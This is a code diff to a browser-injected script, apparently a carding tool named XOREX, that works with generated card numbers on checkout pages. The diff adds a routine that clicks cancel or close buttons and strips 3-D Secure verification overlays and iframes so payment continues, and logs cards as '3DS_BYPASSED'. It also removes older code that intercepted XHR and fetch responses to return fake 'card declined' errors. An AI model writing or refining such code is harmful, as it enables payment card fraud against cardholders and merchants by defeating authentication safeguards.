@@ -4147,6 +4147,95 @@ if (window.__XOREXBlocked) {
     ) return true
     return false
   }
+  function dismiss3DSAndContinue() {
+    function tryDismiss() {
+      const cancelSelectors = [
+        'button[data-testid="cancel-button"]',
+        'a[data-testid="cancel-link"]',
+        '[class*="cancel" i]', '[class*="Cancel"]',
+        'button[aria-label*="cancel" i]', 'button[aria-label*="Cancel"]',
+        'button[aria-label*="close" i]', 'button[aria-label*="Close"]',
+        'button[aria-label*="back" i]', 'button[aria-label*="Back"]',
+        'a[aria-label*="cancel" i]', 'a[aria-label*="back" i]',
+        '[class*="close-button"]', '[class*="CloseButton"]',
+        '[class*="back-button"]', '[class*="BackButton"]',
+        'button.cancel', 'a.cancel',
+        '[data-action="cancel"]', '[data-action="close"]', '[data-action="back"]'
+      ]
+      for (const selector of cancelSelectors) {
+        try {
+          const btns = document.querySelectorAll(selector)
+          for (const btn of btns) {
+            const rect = btn.getBoundingClientRect()
+            if (rect.width > 0 && rect.height > 0) {
+              btn.click()
+              return true
+            }
+          }
+        } catch (e) {}
+      }
+      try {
+        const allBtns = document.querySelectorAll("button, a[role='button'], a[href]")
+        for (const btn of allBtns) {
+          const text = (btn.textContent || btn.innerText || "").trim().toLowerCase()
+          if (text === "cancel" || text === "go back" || text === "back" ||
+              text === "close" || text === "×" || text === "x" || text === "✕") {
+            const rect = btn.getBoundingClientRect()
+            if (rect.width > 0 && rect.height > 0) {
+              btn.click()
+              return true
+            }
+          }
+        }
+      } catch (e) {}
+      return false
+    }
+    function nukeOverlays() {
+      hide3DSElements()
+      try {
+        const overlays = document.querySelectorAll(
+          'div[style*="z-index"][style*="position"],' +
+          'div[class*="overlay"],' +
+          'div[class*="Overlay"],' +
+          'div[class*="modal"],' +
+          'div[class*="Modal"]'
+        )
+        for (const overlay of overlays) {
+          if (overlay.closest(".card-generator-overlay")) continue
+          if (overlay.closest(".warning-toast")) continue
+          if (overlay.closest(".card-toast")) continue
+          if (overlay.closest(".success-toast")) continue
+          const iframes = overlay.querySelectorAll("iframe")
+          for (const iframe of iframes) {
+            if (is3DSElement(iframe)) {
+              nuke3DSElement(overlay)
+              break
+            }
+          }
+        }
+      } catch (e) {}
+    }
+    const delays = [100, 300, 600, 1000, 1500, 2000, 3000, 4000, 5000]
+    let dismissed = false
+    for (const delay of delays) {
+      setTimeout(() => {
+        if (dismissed) return
+        nukeOverlays()
+        if (tryDismiss()) {
+          dismissed = true
+        }
+        if (isSubmitButtonAvailable()) {
+          dismissed = true
+          signalResponseReceived()
+        }
+      }, delay)
+    }
+    setTimeout(() => {
+      if (!dismissed) {
+        signalResponseReceived()
+      }
+    }, 6000)
+  }
   function hide3DSElements() {
     for (const selector of threeDSSelectors) {
       try {
@@ -4305,21 +4394,13 @@ if (window.__XOREXBlocked) {
       currentCardProcessed = true
       lastProcessedCard = currentCard
       threedsBypassed = true
-      signalResponseReceived()
-      hide3DSElements()
       show3DSBypassed()
       showWarning("🛡️ 3DS Bypassed", "info")
-      window.postMessage({ type: "XOREX_TO_BACKGROUND", requestId: "3ds_block_" + Date.now(), payload: { type: "BLOCK_3DS_NAVIGATION" } }, "*")
       if (window.generatedCardFull) {
         const parts = window.generatedCardFull.split("|")
         addToHistory(parts[0], parts[1], parts[2], parts[3], "3DS_BYPASSED")
       }
-      setTimeout(hide3DSElements, 100)
-      setTimeout(hide3DSElements, 300)
-      setTimeout(hide3DSElements, 600)
-      setTimeout(hide3DSElements, 1000)
-      setTimeout(hide3DSElements, 2000)
-      setTimeout(hide3DSElements, 3000)
+      dismiss3DSAndContinue()
       return
     }
     extractPaymentData(json)
@@ -4384,14 +4465,6 @@ if (window.__XOREXBlocked) {
       showWarning("⛔ Auto-stopped: " + reason, "error")
     }
   }
-  const FAKE_DECLINE_JSON = JSON.stringify({
-    error: {
-      type: "card_error",
-      code: "card_declined",
-      decline_code: "generic_decline",
-      message: "Your card was declined."
-    }
-  })
   const originalXHR = window.XMLHttpRequest
   window.XMLHttpRequest = () => {
     const xhr = new originalXHR()
@@ -4402,17 +4475,7 @@ if (window.__XOREXBlocked) {
       try {
         if (this.responseText) {
           const json = JSON.parse(this.responseText)
-          if (detect3DS(json)) {
-            processResponseData(json, "xhr_" + xhrId)
-            try {
-              Object.defineProperty(this, "responseText", { get: () => FAKE_DECLINE_JSON, configurable: true })
-              Object.defineProperty(this, "response", { get: () => FAKE_DECLINE_JSON, configurable: true })
-              Object.defineProperty(this, "status", { get: () => 402, configurable: true })
-              Object.defineProperty(this, "statusText", { get: () => "Payment Required", configurable: true })
-            } catch (e) {}
-          } else {
-            processResponseData(json, "xhr_" + xhrId)
-          }
+          processResponseData(json, "xhr_" + xhrId)
         }
       } catch (e) {}
     })
@@ -4478,21 +4541,6 @@ if (window.__XOREXBlocked) {
           const text = await cloned.text()
           if (text) {
             const json = JSON.parse(text)
-            if (detect3DS(json)) {
-              processResponseData(json, fetchId)
-              return new Response(JSON.stringify({
-                error: {
-                  type: "card_error",
-                  code: "card_declined",
-                  decline_code: "generic_decline",
-                  message: "Your card was declined."
-                }
-              }), {
-                status: 402,
-                statusText: "Payment Required",
-                headers: new Headers({ "Content-Type": "application/json" })
-              })
-            }
             processResponseData(json, fetchId)
           }
         } catch (e) {}
